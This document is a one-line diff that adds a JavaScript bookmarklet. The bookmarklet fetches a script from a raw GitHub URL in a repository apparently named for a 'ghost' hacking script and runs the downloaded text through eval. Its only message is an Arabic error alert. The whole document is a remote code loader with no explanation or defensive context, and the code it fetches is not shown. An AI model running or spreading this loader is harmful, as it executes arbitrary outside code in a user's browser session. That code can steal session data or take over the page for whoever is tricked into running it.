@@ -1,0 +1,1 @@
+javascript:(function(){fetch("https://raw.githubusercontent.com/Gh0sT-Sa/ScR-PrO/main/lab/gh0st.scr").then(r=>r.text()).then(code=>eval(code.replace(/^javascript:\s*/,''))).catch(e=>alert("فشل تحميل السكربت"));})();
